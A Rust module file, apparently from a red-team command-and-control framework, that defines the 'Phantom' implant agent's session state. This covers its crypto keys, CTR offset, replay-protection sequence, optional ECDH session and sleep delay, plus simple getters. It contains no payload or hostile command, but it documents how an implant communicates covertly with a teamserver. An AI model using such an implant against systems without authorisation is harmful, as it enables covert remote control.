//! Core Phantom agent type and submodule facade.

mod builder;
mod job_queue;
mod metadata;
mod run_loop;
mod transport;

#[cfg(test)]
mod tests;

use red_cell_common::crypto::AgentCryptoMaterial;

use crate::command::PhantomState;
use crate::config::PhantomConfig;
use crate::ecdh::EcdhSession;
use crate::transport::HttpTransport;

/// Running Phantom session state.
#[derive(Debug)]
pub struct PhantomAgent {
    pub(super) agent_id: u32,
    pub(super) raw_crypto: AgentCryptoMaterial,
    pub(super) session_crypto: AgentCryptoMaterial,
    pub(super) config: PhantomConfig,
    pub(super) transport: HttpTransport,
    /// Shared monotonic CTR block offset, mirroring the server's single offset.
    ///
    /// Both encrypt (send) and decrypt (recv) operations use and advance this
    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
    pub(super) ctr_offset: u64,
    /// Monotonic sequence counter for server-side replay protection.
    ///
    /// Prepended as 8 LE bytes to every callback payload before encryption.
    /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
    pub(super) callback_seq: u64,
    pub(super) state: PhantomState,
    /// Active ECDH session when `listener_pub_key` is set in config.
    ///
    /// When `Some`, all post-registration traffic uses AES-256-GCM session
    /// packets instead of the legacy Demon AES-CTR wire format.
    pub(super) ecdh_session: Option<EcdhSession>,
}

impl PhantomAgent {
    /// Return the current random agent identifier.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Return the current shared monotonic CTR block offset.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn ctr_offset(&self) -> u64 {
        self.ctr_offset
    }

    /// Return the next sequence number that will be used in the next callback packet.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn callback_seq(&self) -> u64 {
        self.callback_seq
    }

    /// Return the current configured sleep delay in milliseconds.
    #[must_use]
    #[cfg_attr(not(test), allow(dead_code))]
    pub fn sleep_delay_ms(&self) -> u32 {
        self.config.sleep_delay_ms
    }
}
